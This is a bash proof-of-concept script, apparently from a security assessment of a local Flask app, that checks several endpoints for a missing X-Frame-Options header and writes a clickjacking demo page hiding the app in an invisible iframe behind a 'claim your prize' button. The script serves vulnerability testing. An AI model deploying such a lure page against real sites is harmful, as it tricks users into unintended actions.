#!/bin/bash

# POC: Missing X-Frame-Options HTTP Security Header
# Description: Demonstrates that the Flask application does not implement X-Frame-Options header
# This allows the application to be framed by any website, enabling clickjacking attacks

TARGET_URL="http://localhost:5000"
ENDPOINTS=("/" "/xss25" "/static/css/style.css")

echo "=== X-Frame-Options Header Verification POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test each endpoint
for endpoint in "${ENDPOINTS[@]}"; do
    echo "Testing endpoint: $endpoint"
    response=$(curl -s -I "$TARGET_URL$endpoint")
    
    # Check if X-Frame-Options header exists
    if echo "$response" | grep -qi "X-Frame-Options"; then
        echo "✓ X-Frame-Options header found"
        echo "$response" | grep -i "X-Frame-Options"
    else
        echo "✗ X-Frame-Options header is MISSING"
        
        # Display all response headers for verification
        echo "Response headers:"
        echo "$response" | head -n 10
    fi
    echo ""
done

echo "=== Vulnerability Confirmation ==="
echo "The application is vulnerable to clickjacking attacks:"
echo "- X-Frame-Options header is not present"
echo "- Attackers can embed this application in an invisible iframe"
echo "- Users can be tricked into performing unintended actions"
echo ""

# Create a clickjacking POC HTML file
echo "=== Generating Clickjacking POC HTML ==="
cat > /tmp/clickjacking_poc.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Legitimate-Looking Page</title>
</head>
<body>
    <h1>Click here to claim your prize!</h1>
    <button>Claim Prize</button>
    
    <!-- Hidden iframe embedding the vulnerable application -->
    <iframe src="http://localhost:5000/" style="position: absolute; left: -9999px; top: -9999px; width: 100%; height: 100%; opacity: 0;"></iframe>
    
    <script>
        // JavaScript to track clicks on the visible button
        document.querySelector('button').addEventListener('click', function(e) {
            console.log('User clicked - this could trigger an action on the hidden iframe');
            // Attacker could programmatically interact with the iframe content
        });
    </script>
</body>
</html>
EOF

echo "Clickjacking POC HTML saved to: /tmp/clickjacking_poc.html"
echo ""

# Verify vulnerability status
echo "=== Final Verification ==="
main_response=$(curl -s -I "$TARGET_URL/")
if ! echo "$main_response" | grep -qi "X-Frame-Options"; then
    echo "VULNERABLE: X-Frame-Options header is missing"
    exit 0
else
    echo "NOT VULNERABLE: X-Frame-Options header is present"
    exit 1
fi